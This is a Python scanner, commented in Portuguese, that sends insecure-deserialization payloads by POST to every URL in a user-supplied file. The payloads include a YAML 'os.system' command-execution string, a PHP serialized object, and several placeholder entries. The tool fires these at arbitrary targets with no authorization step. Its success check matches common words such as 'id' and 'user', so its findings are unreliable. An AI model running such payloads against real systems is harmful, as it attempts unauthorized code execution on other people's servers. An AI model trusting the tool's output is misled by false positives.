import requests
from urllib.parse import quote

# Cores para terminal
class Colors:
    GREEN = '\033[92m'  # Verde
    RED = '\033[91m'    # Vermelho
    YELLOW = '\033[93m'  # Amarelo
    RESET = '\033[0m'   # Resetar cor

# Payloads comuns para testes de insecure deserialization
PAYLOADS = [
    "O:4:\"Test\":1:{s:4:\"data\";s:5:\"value\";}",  # Exemplo de objeto PHP
    '{"__class__": "OSCommandInjection", "cmd": "id"}',  # Exemplo para injeção de comando
    "greeting: !!python/object/apply:os.system [id]",  # Exemplo em Python
    # Adicione outros payloads conforme necessário
    '{"__type__":"MyClass","data":"[malicious code]"}',  # Payload fictício
    "<xml><object class='MaliciousClass'><command>exec</command></object></xml>"  # Exemplo de XML
]

# Função para testar a deserialização insegura
def test_insecure_deserialization(url, payload):
    try:
        response = requests.post(url, data=payload, timeout=5)
        # Exibir status code e um trecho da resposta para análise
        print(f"[DEBUG] Status Code: {response.status_code}, Response Length: {len(response.text)}")

        if response.status_code == 200:
            # Verificar padrões na resposta que indicam a execução do payload
            if "id" in response.text or "user" in response.text or "success" in response.text:
                return f"{Colors.GREEN}[+] Vulnerabilidade de Insecure Deserialization encontrada em {url}{Colors.RESET}"
            elif len(response.text) < 100 and ("error" not in response.text):  # Evita mensagens de erro comuns
                return f"{Colors.YELLOW}[-] Possível deserialização insegura em {url} (sem confirmação clara){Colors.RESET}"
    except requests.RequestException as e:
        return f"{Colors.RED}[!] Erro ao acessar {url}: {e}{Colors.RESET}"

def check_url(url):
    results = []
    for payload in PAYLOADS:
        encoded_payload = quote(payload)  # Codificando o payload
        result = test_insecure_deserialization(url, encoded_payload)
        if result:
            results.append(result)
    return results

def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        print(f"{Colors.RED}[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.{Colors.RESET}")
        return

    print(f"Iniciando verificação de Insecure Deserialization nas URLs do arquivo: {file_path}\n")
    
    total_vulnerabilities = 0

    for url in urls:
        print(f"Verificando URL: {url}")
        results = check_url(url)
        for result in results:
            print(result)
            total_vulnerabilities += 1

    print(f"\nVerificação concluída. Total de vulnerabilidades encontradas: {total_vulnerabilities}")

if __name__ == "__main__":
    file_path = input("URLs File: ")
    main(file_path)
